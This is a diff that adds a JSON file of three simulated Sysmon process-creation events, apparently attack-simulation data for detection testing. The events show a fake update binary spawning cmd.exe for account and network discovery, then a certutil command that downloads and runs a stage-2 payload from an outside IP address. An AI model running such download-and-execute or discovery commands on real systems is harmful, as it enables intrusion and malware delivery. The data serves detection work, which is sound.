@@ -1,0 +1,122 @@
+[
+  {
+    "@timestamp": "2026-03-08T09:14:22.341Z",
+    "event": {
+      "category": "process",
+      "type": "start",
+      "action": "Process Create (rule: ProcessCreate)",
+      "code": "1"
+    },
+    "process": {
+      "pid": 4872,
+      "name": "update_helper.exe",
+      "executable": "C:\\ProgramData\\WindowsUpdate\\update_helper.exe",
+      "command_line": "C:\\ProgramData\\WindowsUpdate\\update_helper.exe",
+      "parent": {
+        "pid": 3120,
+        "name": "svchost.exe",
+        "executable": "C:\\Windows\\System32\\svchost.exe"
+      }
+    },
+    "user": {
+      "name": "agarcia",
+      "domain": "CORP"
+    },
+    "host": {
+      "name": "WS-EXEC-01",
+      "os": {
+        "platform": "windows"
+      }
+    },
+    "agent": {
+      "type": "sysmon"
+    },
+    "_simulation": {
+      "type": "attack",
+      "technique": "T1059.003",
+      "sequence_order": 1,
+      "sequence_total": 3,
+      "description": "Malicious binary masquerading as Windows update helper launches from non-standard ProgramData path"
+    }
+  },
+  {
+    "@timestamp": "2026-03-08T09:14:23.807Z",
+    "event": {
+      "category": "process",
+      "type": "start",
+      "action": "Process Create (rule: ProcessCreate)",
+      "code": "1"
+    },
+    "process": {
+      "pid": 5104,
+      "name": "cmd.exe",
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command_line": "cmd.exe /c whoami & net user agarcia /domain & ipconfig /all & net localgroup administrators",
+      "parent": {
+        "pid": 4872,
+        "name": "update_helper.exe",
+        "executable": "C:\\ProgramData\\WindowsUpdate\\update_helper.exe"
+      }
+    },
+    "user": {
+      "name": "agarcia",
+      "domain": "CORP"
+    },
+    "host": {
+      "name": "WS-EXEC-01",
+      "os": {
+        "platform": "windows"
+      }
+    },
+    "agent": {
+      "type": "sysmon"
+    },
+    "_simulation": {
+      "type": "attack",
+      "technique": "T1059.003",
+      "sequence_order": 2,
+      "sequence_total": 3,
+      "description": "cmd.exe spawned by update_helper.exe executing chained discovery commands via Windows Command Shell"
+    }
+  },
+  {
+    "@timestamp": "2026-03-08T09:14:31.194Z",
+    "event": {
+      "category": "process",
+      "type": "start",
+      "action": "Process Create (rule: ProcessCreate)",
+      "code": "1"
+    },
+    "process": {
+      "pid": 5388,
+      "name": "cmd.exe",
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command_line": "cmd.exe /c certutil.exe -urlcache -split -f http://185.220.101.47/stage2.bin C:\\ProgramData\\WindowsUpdate\\stage2.bin & start C:\\ProgramData\\WindowsUpdate\\stage2.bin",
+      "parent": {
+        "pid": 4872,
+        "name": "update_helper.exe",
+        "executable": "C:\\ProgramData\\WindowsUpdate\\update_helper.exe"
+      }
+    },
+    "user": {
+      "name": "agarcia",
+      "domain": "CORP"
+    },
+    "host": {
+      "name": "WS-EXEC-01",
+      "os": {
+        "platform": "windows"
+      }
+    },
+    "agent": {
+      "type": "sysmon"
+    },
+    "_simulation": {
+      "type": "attack",
+      "technique": "T1059.003",
+      "sequence_order": 3,
+      "sequence_total": 3,
+      "description": "cmd.exe used to invoke certutil for stage-2 payload download and execution \u2014 classic living-off-the-land follow-on"
+    }
+  }
+]
